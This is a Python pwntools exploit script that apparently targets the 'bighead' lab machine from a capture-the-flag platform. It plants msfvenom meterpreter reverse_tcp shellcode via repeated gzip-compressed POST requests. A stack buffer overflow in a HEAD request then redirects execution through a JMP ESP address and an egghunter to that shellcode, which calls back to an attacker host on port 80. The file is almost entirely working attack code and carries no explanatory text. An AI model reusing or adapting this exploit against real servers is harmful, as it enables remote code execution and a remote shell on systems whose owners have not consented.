#!/usr/bin/python
from pwn import *
import zlib

jmpesp = '31135062'
host = 'dev.bighead.htb'
port = 80

stage1 = 'POST / HTTP/1.1\r\nContent-Encoding: gzip\r\nHost: dev.bighead.htb\r\n'

# msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=10.10.14.19 LPORT=80 EXITFUNC=thread -f python -b '\x00\x0a\x0d'
buf =  "w00tw00t"
buf += "\xba\xe3\x43\x21\xf3\xd9\xc1\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x5b\x31\x57\x14\x83\xc7\x04\x03\x57\x10\x01"
buf += "\xb6\xdd\x1b\x47\x39\x1e\xdc\x27\xb3\xfb\xed\x67\xa7"
buf += "\x88\x5e\x57\xa3\xdd\x52\x1c\xe1\xf5\xe1\x50\x2e\xf9"
buf += "\x42\xde\x08\x34\x52\x72\x68\x57\xd0\x88\xbd\xb7\xe9"
buf += "\x43\xb0\xb6\x2e\xb9\x39\xea\xe7\xb6\xec\x1b\x83\x82"
buf += "\x2c\x97\xdf\x03\x35\x44\x97\x22\x14\xdb\xa3\x7d\xb6"
buf += "\xdd\x60\xf6\xff\xc5\x65\x32\x49\x7d\x5d\xc9\x48\x57"
buf += "\xaf\x32\xe6\x96\x1f\xc1\xf6\xdf\x98\x39\x8d\x29\xdb"
buf += "\xc4\x96\xed\xa1\x12\x12\xf6\x02\xd1\x84\xd2\xb3\x36"
buf += "\x52\x90\xb8\xf3\x10\xfe\xdc\x02\xf4\x74\xd8\x8f\xfb"
buf += "\x5a\x68\xcb\xdf\x7e\x30\x88\x7e\x26\x9c\x7f\x7e\x38"
buf += "\x7f\x20\xda\x32\x92\x35\x57\x19\xfb\xfa\x5a\xa2\xfb"
buf += "\x94\xed\xd1\xc9\x3b\x46\x7e\x62\xb4\x40\x79\xf3\xd2"
buf += "\x72\x55\xbb\xb2\x8c\x56\xbc\x9b\x4a\x02\xec\xb3\x7b"
buf += "\x2b\x67\x43\x83\xfe\x12\x49\x13\x0b\xe9\x40\x6e\x63"
buf += "\xef\x5a\x70\x24\x66\xbc\x20\x94\x28\x10\x81\x44\x89"
buf += "\xc0\x69\x8f\x06\x3f\x89\xb0\xcc\x28\x20\x5f\xb9\x01"
buf += "\xdd\xc6\xe0\xd9\x7c\x06\x3f\xa4\xbf\x8c\xca\x59\x71"
buf += "\x65\xbe\x49\x66\x12\x40\x91\x77\xb7\x40\xfb\x73\x11"
buf += "\x16\x93\x79\x44\x50\x3c\x81\xa3\xe2\x3a\x7d\x32\xd3"
buf += "\x31\x48\xa0\x5b\x2d\xb5\x24\x5c\xad\xe3\x2e\x5c\xc5"
buf += "\x53\x0b\x0f\xf0\x9b\x86\x23\xa9\x09\x29\x12\x1e\x99"
buf += "\x41\x98\x79\xed\xcd\x63\xac\x6d\x09\x9b\x33\x5a\xb2"
buf += "\xf4\xcb\xda\x42\x05\xa1\xda\x12\x6d\x3e\xf4\x9d\x5d"
buf += "\xbf\xdf\xf5\xf5\x4a\x8e\xb4\x64\x4b\x9b\x19\x39\x4c"
buf += "\x28\x82\xca\x37\x41\x35\x2b\xc8\x4b\x52\x2b\xc9\x73"
buf += "\x64\x17\x1c\x4a\x12\x56\x9d\xe9\x3d\x45\x0b\x04\xd6"
buf += "\xd0\xde\xa5\xbb\xe2\x35\xe9\xc5\x60\xbf\x92\x31\x78"
buf += "\xca\x97\x7e\x3e\x27\xea\xef\xab\x47\x59\x0f\xfe"

for i in range(25):
    stage1 += "Content-Length: {}\r\n\r\n".format(len(buf)) + zlib.compress(buf) + "\r\n\r\n"
    r = remote(host, port)
    r.send(stage1)
    r.close()

egg_hunt = "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"
stage2 = 'HEAD /coffee' + 'A' * 66 + jmpesp + egg_hunt
stage2 += ' HTTP/1.1 \r\nHost: dev.bighead.htb\r\n\r\n'
r = remote(host, port)
r.send(stage2)
print(r.recvline(timeout=5))
r.close()
